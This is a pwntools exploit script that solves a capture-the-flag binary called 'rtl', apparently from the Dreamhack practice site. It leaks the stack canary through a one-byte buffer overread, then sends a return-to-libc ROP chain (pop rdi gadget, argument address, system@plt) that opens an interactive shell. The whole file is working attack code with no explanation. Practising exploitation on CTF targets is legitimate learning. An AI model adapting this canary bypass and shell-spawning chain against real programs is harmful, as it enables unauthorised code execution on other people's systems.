#!/usr/bin/env python3
from pwn import *
exe = ELF('rtl', checksec = False)

p = process(exe.path)
# p = remote('host3.dreamhack.games', 17943)

# stage 1 leak canary
p.sendafter(b'Buf: ', b'A'*(0x38 + 1))
p.recvuntil(b'A'*0x39)

canary = u64(b'\0' + p.recv(7))
log.info("canary: " + hex(canary))
input()

# stage 2 get shell
pop_rdi = 0x0000000000400853
parameter = 0x400874
systemplt = exe.plt['system']
ret = 0x00000000004007e7
payload = b'A'*0x38 + p64(canary)
payload += p64(0)
# payload += p64(ret)
payload += p64(pop_rdi) + p64(parameter)
payload += p64(systemplt)
p.sendafter(b'Buf: ', payload)

p.interactive()